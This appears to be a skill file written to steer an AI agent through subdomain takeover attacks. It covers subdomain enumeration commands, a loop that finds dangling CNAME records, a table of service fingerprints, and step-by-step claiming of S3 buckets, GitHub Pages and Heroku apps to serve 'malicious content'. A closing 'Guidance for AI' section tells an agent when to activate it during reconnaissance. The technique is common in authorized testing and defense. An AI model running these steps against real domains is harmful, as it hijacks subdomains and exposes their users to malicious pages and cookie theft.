# Subdomain Takeover Skill

## Goal

Identify and exploit subdomain takeover vulnerabilities to control subdomain content via dangling DNS records.

## Methodology

1. **Enumerate Subdomains:** Discover all subdomains of the target
2. **Identify Dangling Records:** Find DNS records pointing to unclaimed resources
3. **Verify Takeover Potential:** Confirm the external service allows claiming
4. **Claim Resource:** Register the external resource to control the subdomain
5. **Demonstrate Impact:** Show control over subdomain content

## Subdomain Enumeration

```bash
# Using subfinder
subfinder -d target.com -o subdomains.txt

# Using amass
amass enum -passive -d target.com -o subdomains.txt

# Using dnsrecon
dnsrecon -d target.com -t brt

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value'
```

## Identifying Dangling Records

```bash
# Check CNAME records
for sub in $(cat subdomains.txt); do
  cname=$(dig CNAME $sub +short)
  if [ -n "$cname" ]; then
    echo "$sub -> $cname"
    # Check if CNAME target is claimable
    curl -sI "http://$cname" | head -1
  fi
done
```

## Common Takeover Signatures

| Service | Fingerprint |
|---------|-------------|
| GitHub Pages | "There isn't a GitHub Pages site here" |
| Heroku | "No such app" |
| AWS S3 | "NoSuchBucket" |
| Shopify | "Sorry, this shop is currently unavailable" |
| Tumblr | "There's nothing here" |
| Ghost | "The thing you were looking for is no longer here" |
| Zendesk | "Help Center Closed" |
| Azure | "404 Web Site not found" |
| Fastly | "Fastly error: unknown domain" |
| Pantheon | "404 error unknown site" |
| Cargo | "404 Not Found" for subdomain |
| Surge.sh | "project not found" |

## Verification Process

```bash
# 1. Check DNS resolution
dig blog.target.com

# 2. Check HTTP response for takeover signature
curl -sI https://blog.target.com

# 3. Verify on service
# For GitHub: Check if repo exists
# For S3: Check if bucket is claimable
# For Heroku: Check if app name is available
```

## Exploitation Examples

### GitHub Pages
```bash
# Subdomain: docs.target.com
# CNAME: target-docs.github.io

# Create repo: target-docs/target-docs.github.io
# Add CNAME file with: docs.target.com
# Content now served on docs.target.com
```

### AWS S3
```bash
# Subdomain: assets.target.com
# CNAME: assets-target.s3.amazonaws.com

# Create bucket: assets-target
# Upload malicious content
aws s3 mb s3://assets-target
echo "<h1>Pwned</h1>" > index.html
aws s3 cp index.html s3://assets-target/
```

### Heroku
```bash
# Subdomain: app.target.com  
# CNAME: app-target.herokuapp.com

# If app-target not registered:
heroku create app-target
# Deploy malicious app
```

## Automated Tools

```bash
# subjack
subjack -w subdomains.txt -t 100 -o results.txt -ssl

# nuclei with takeover templates
nuclei -l subdomains.txt -t takeovers/

# can-i-take-over-xyz
# Reference: https://github.com/EdOverflow/can-i-take-over-xyz
```

## Tools

* **subjack** - Subdomain takeover detection
* **nuclei** - Vulnerability scanner with takeover templates
* **subfinder** - Subdomain enumeration
* **can-i-take-over-xyz** - Takeover reference database

## Guidance for AI

* Activate during reconnaissance and external attack surface assessment
* Enumerate subdomains first, then check for dangling records
* Not all dangling CNAME records are takeover-able
* Check can-i-take-over-xyz for current vulnerable services
* Some services (CloudFront) require specific claiming process
* Takeover severity depends on the subdomain's trust level
* Cookie scoping on parent domain affects impact
